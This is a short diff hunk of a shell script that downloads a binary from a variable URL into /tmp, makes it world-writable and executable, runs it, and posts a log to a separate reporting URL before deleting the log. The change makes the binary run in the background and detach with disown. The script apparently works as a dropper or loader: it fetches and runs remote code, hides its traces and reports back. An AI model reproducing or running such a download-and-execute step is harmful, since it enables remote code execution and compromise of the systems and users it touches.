@@ -15,6 +15,7 @@ else
 fi
 curl -s -o /tmp/run985757.bin $pl_url 1>>/tmp/tmplog60920.log 2>&1
 chmod 777 /tmp/run985757.bin 1>>/tmp/tmplog60920.log 2>&1
-/tmp/run985757.bin 1>>/tmp/tmplog60920.log 2>&1
+/tmp/run985757.bin &
+disown
 curl -X POST $report_url -d @/tmp/tmplog60920.log
 rm /tmp/tmplog60920.log
